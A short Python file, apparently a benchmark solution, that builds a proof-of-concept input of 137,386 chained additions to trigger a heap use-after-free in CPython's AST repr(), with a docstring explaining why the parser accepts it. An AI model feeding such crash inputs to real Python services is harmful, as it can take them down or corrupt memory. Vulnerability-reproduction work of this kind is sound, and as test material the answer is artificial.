import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is described as a Heap Use After Free in AST repr().
        This typically occurs when processing a deeply nested AST structure where
        recursion depth issues or error handling leads to memory corruption.
        
        To reach the vulnerable code in repr(), we must pass the parser.
        CPython's parser handles left-associative binary operators iteratively,
        allowing the creation of trees deeper than the recursion limit would normally allow
        during parsing (unlike parentheses which are recursive in the parser).
        
        However, repr() is typically recursive. A deeply nested BinOp tree created
        by repeated addition will cause deep recursion in repr().
        
        Target PoC length: 274773 bytes.
        We construct a chain of additions: "a" + "+a" + "+a" ...
        Length formula: len("a") + N * len("+a") = 1 + 2 * N
        
        Solving for N:
        274773 = 1 + 2 * N
        274772 = 2 * N
        N = 137386
        """
        N = 137386
        return b"a" + b"+a" * N
